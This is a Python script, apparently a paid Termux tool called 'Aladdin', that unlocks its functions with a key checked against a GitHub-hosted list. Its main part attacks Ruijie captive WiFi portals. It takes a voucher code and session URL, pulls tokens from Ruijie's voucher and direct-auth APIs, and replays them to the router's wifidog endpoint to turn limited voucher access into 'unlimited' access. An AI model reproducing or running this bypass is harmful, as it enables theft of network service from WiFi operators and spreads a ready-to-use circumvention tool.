import re
import requests
import os
import sys
import random
import string

# ==================== GITHUB CONFIGURATION ====================
GITHUB_RAW_URL = "https://raw.githubusercontent.com/heinminchit73-svg/Aladdin/refs/heads/main/aladdin.py"
# ==============================================================

# သိမ်းဆည်းမည့် လျှို့ဝှက်ဖိုင်လမ်းကြောင်းများ
DEVICE_ID_FILE = os.path.expanduser("~/.termux/.dev_id_config")
SAVED_KEY_FILE = os.path.expanduser("~/.termux/.saved_key_config")

# ANSI Color Codes
GREEN = "\033[1;32m"
RED = "\033[1;31m"
YELLOW = "\033[1;33m"
BLUE = "\033[1;34m"
CYAN = "\033[1;36m"
WHITE = "\033[1;37m"
RESET = "\033[0m"

def line():
    print(CYAN + "═" * os.get_terminal_size()[0] + RESET)

def generate_device_id():
    """A-Z နှင့် 0-9 သေချာပေါက် ရောနှောပါဝင်သော ၁၀ လုံးပါ ID ထုတ်ပေးရန်"""
    letters = string.ascii_uppercase
    digits = string.digits
    
    picked = [random.choice(letters), random.choice(digits)]
    all_chars = letters + digits
    picked += [random.choice(all_chars) for _ in range(8)]
    
    random.shuffle(picked)
    return f"ALD-{''.join(picked)}"

def get_or_create_device_id():
    if os.path.exists(DEVICE_ID_FILE):
        with open(DEVICE_ID_FILE, "r") as f:
            device_id = f.read().strip()
            if device_id and len(device_id) == 14: 
                return device_id

    os.makedirs(os.path.dirname(DEVICE_ID_FILE), exist_ok=True)
    new_id = generate_device_id()
    with open(DEVICE_ID_FILE, "w") as f:
        f.write(new_id)
    return new_id

def show_key_banner():
    os.system("clear")
    print(CYAN + "╔══════════════════════════════════════════════════════════════╗" + RESET)
    print(GREEN + "   █████╗ ██╗      █████╗ ██████╗ ██████╗ ██╗███╗   ██╗" + RESET)
    print(GREEN + "  ██╔══██╗██║     ██╔══██╗██╔══██╗██╔══██╗██║████╗  ██║" + RESET)
    print(WHITE + "  ███████║██║     ███████║██║  ██║██║  ██║██║██╔██╗ ██║" + RESET)
    print(WHITE + "  ██╔══██║██║     ██╔══██║██║  ██║██║  ██║██║██║╚██╗██║" + RESET)
    print(GREEN + "  ██║  ██║███████╗██║  ██║██████╔╝██████╔╝██║██║ ╚████║" + RESET)
    print(GREEN + "  ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═════╝ ╚═════╝ ╚═╝╚═╝  ╚═══╝" + RESET)
    print(YELLOW + "                STARLINK BYPASS | VIP SYSTEM                  " + RESET)
    print(CYAN + "╠══════════════════════════════════════════════════════════════╣" + RESET)
    print(WHITE + "             👉 PUT IN ACCESS KEY TO USE SYSTEM 👈             " + RESET)
    print(CYAN + "╚══════════════════════════════════════════════════════════════╝" + RESET)

def show_main_banner(credit):
    os.system("clear")
    print(GREEN + "╔══════════════════════════════════════════════════════════════╗" + RESET)
    print(GREEN + "   █████╗ ██╗      █████╗ ██████╗ ██████╗ ██╗███╗   ██╗" + RESET)
    print(GREEN + "  ██╔══██╗██║     ██╔══██╗██╔══██╗██╔══██╗██║████╗  ██║" + RESET)
    print(WHITE + "  ███████║██║     ███████║██║  ██║██║  ██║██║██╔██╗ ██║" + RESET)
    print(WHITE + "  ██╔══██║██║     ██╔══██║██║  ██║██║  ██║██║██║╚██╗██║" + RESET)
    print(GREEN + "  ██║  ██║███████╗██║  ██║██████╔╝██████╔╝██║██║ ╚████║" + RESET)
    print(GREEN + "  ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═════╝ ╚═════╝ ╚═╝╚═╝  ╚═══╝" + RESET)
    print(YELLOW + "             👑 UNLIMITED VIP SYSTEM ACTIVATED 👑             " + RESET)
    print(CYAN + "╠══════════════════════════════════════════════════════════════╣" + RESET)
    print(f"{BLUE}  [+] SYSTEM STATUS    : {GREEN}ACTIVE ✔️{RESET}")
    print(f"{BLUE}  [+] REMAINING CREDIT : {YELLOW}[ {credit} ] TIMES{RESET}")
    print(CYAN + "╚══════════════════════════════════════════════════════════════╝" + RESET)
    line()

def fetch_github_keys():
    headers = {
        "Cache-Control": "no-cache",
        "Pragma": "no-cache"
    }
    try:
        response = requests.get(GITHUB_RAW_URL, headers=headers, timeout=10)
        if response.status_code == 200:
            return response.text.splitlines()
        else:
            print(RED + "[-] GitHub Server မှ ဒေတာဖတ်၍မရပါ။ URL မှန်ကန်မှု စစ်ဆေးပါ။")
            sys.exit(1)
    except requests.RequestException:
        print(RED + "[-] ကွန်ရက်ချက်ဆက်မှု ချို့ယွင်းနေပါသည်။")
        sys.exit(1)

def verify_and_update_credit(device_id, user_key, lines):
    key_found = False
    valid_credit = 0

    device_id = device_id.strip()
    user_key = user_key.strip()

    for line_data in lines:
        line_data = line_data.strip()
        if not line_data:
            continue
        
        parts = line_data.split("|")
        if len(parts) == 3:
            db_device_id = parts[0].strip()
            db_key_name = parts[1].strip()
            db_credit = parts[2].strip()

            if db_device_id.lower() == device_id.lower() and db_key_name.lower() == user_key.lower():
                key_found = True
                try:
                    valid_credit = int(db_credit)
                except ValueError:
                    valid_credit = 0
                break

    if not key_found:
        return False, 0

    if valid_credit <= 0:
        return False, 0

    return True, valid_credit

def save_valid_key(user_key):
    os.makedirs(os.path.dirname(SAVED_KEY_FILE), exist_ok=True)
    with open(SAVED_KEY_FILE, "w") as f:
        f.write(user_key)

def get_saved_key():
    if os.path.exists(SAVED_KEY_FILE):
        with open(SAVED_KEY_FILE, "r") as f:
            return f.read().strip()
    return None

def delete_saved_key():
    if os.path.exists(SAVED_KEY_FILE):
        os.remove(SAVED_KEY_FILE)

def key_system():
    device_id = get_or_create_device_id()
    saved_key = get_saved_key()
    
    if saved_key:
        github_lines = fetch_github_keys()
        is_valid, credit = verify_and_update_credit(device_id, saved_key, github_lines)
        if is_valid:
            return credit - 1, saved_key

    delete_saved_key() 
    
    while True:
        show_key_banner()
        print(f"{BLUE}[+] YOUR DEVICE ID : {GREEN}{device_id}{RESET}")
        print(f"{YELLOW}[!] ဤ ID ကို ပိုင်ရှင်ထံ ပို့ပေးပြီး Key ဖွင့်ခိုင်းပါ၊၊{RESET}")
        line()

        user_key = input(WHITE + "Enter Your Key Name: " + RESET).strip()

        if not user_key:
            print(RED + "Key Name ထည့်သွင်းပေးရန် လိုအပ်ပါသည်။")
            input("\nContinue...")
            continue

        print(YELLOW + "\n[*] GitHub Server နှင့် ချိတ်ဆက် စစ်ဆေးနေသည်..." + RESET)
        github_lines = fetch_github_keys()

        is_valid, credit = verify_and_update_credit(device_id, user_key, github_lines)

        if is_valid:
            print(GREEN + "\n[+] ခွင့်ပြုချက် အောင်မြင်ပါသည်။" + RESET)
            save_valid_key(user_key)
            input(WHITE + "\n[Enter] နှိပ်ပြီး စနစ်ထဲသို့ ဝင်ပါ။" + RESET)
            return credit - 1, user_key
        else:
            print(RED + "\n[-] Key မှားယွင်းနေခြင်း သို့မဟုတ် Credit ကုန်ဆုံးနေခြင်း ဖြစ်နိုင်ပါသည်။")
            input(WHITE + "\nပြန်လည်ကြိုးစားရန် [Enter] နှိပ်ပါ..." + RESET)

# ==================== RUIJIE PORTAL LOGIC ====================

def get_session_id(session_url):
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36',
    }
    try:
        response = requests.get(session_url, headers=headers)
        session_id = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", response.url).group(1)
    except Exception:
        print(RED + "Failed to extract session ID.")
        sys.exit(1)
    return session_id

def login_voucher(session_id, voucher):
    data = {"accessCode": voucher, "sessionId": session_id, "apiVersion": 2}
    post_url = "https://portal-as.ruijienetworks.com/api/auth/voucher/?lang=en_US"
    try:
        response = requests.post(post_url, json=data)
        res_text = response.text
        if "Authentication failed" in res_text or "expired" in res_text or "Expired" in res_text:
            print(YELLOW + f"Voucher code {voucher} incorrect")
            sys.exit(1)
        else:
            return re.search('token=(.*?)&', res_text).group(1)
    except Exception:
        print(RED + "Failed to retrieve token.")
        sys.exit(1)

def OneClick(token):
    params = {'lang': 'en_US'}
    json_data = {'phoneNumber':'', 'sessionId': token}
    try:
        response = requests.post('https://portal-as.ruijienetworks.com/api/auth/direct/', params=params, json=json_data)
        return re.search('token=(.*?)&', response.text).group(1)
    except Exception:
        return None

def Auth_as_Unlimited(voucher, ip, session_url):
    for i in range(3):
        session_id = get_session_id(session_url)
        print(GREEN + "Final Inactive Session Id: ", session_id)
        line()
        token = login_voucher(session_id, voucher)
        if token:
            print(GREEN + "Final Active Session Id: ", token)
            line()
            token = OneClick(token)
            if token:
                auth(ip=ip, token=token, final=True)
                print(GREEN + "Successful to change into unlimited")
                break
        print(RED + f"Attempt {i+1} failed")

def auth(voucher=None, ip=None, token=None, session_url=None, final=False):
    params = {'token': token, 'phoneNumber': ''}
    try:
        response = requests.get(f'http://{ip}:2060/wifidog/auth', params=params).url
        if "success" in response or 'baidu.com' in response or "ruijie.com" in response:
            print(GREEN + "Successfully Authenticated")
            line()
            if not final:
                Auth_as_Unlimited(voucher, ip, session_url)
        else:
            print(RED + f"Failed to Authenticate: {response}")
    except Exception as e:
        print(RED + f"Auth Error: {e}")

def current_wifi(remaining_credit):
    show_main_banner(remaining_credit)

    voucher = input(WHITE + "Enter Voucher Code: " + GREEN)
    line()
    print(YELLOW + "The Mac Address from Session URL must be the same as the Mac Address of the User Connected WiFi.")
    line()
    session_url = input(WHITE + "Enter Session Url: " + BLUE)
    line()
    ip = input(WHITE + "Enter Your WiFi Gateway: " + BLUE)
    line()

    session_id = get_session_id(session_url)
    token = login_voucher(session_id, voucher)
    if ip:
        auth(voucher, ip, token, session_url)
    else:
        print(RED + "Failed to retrieve IP address.")

# ==================== MAIN EXECUTION ====================
if __name__ == "__main__":
    remaining_credit, current_key = key_system()
    current_wifi(remaining_credit)
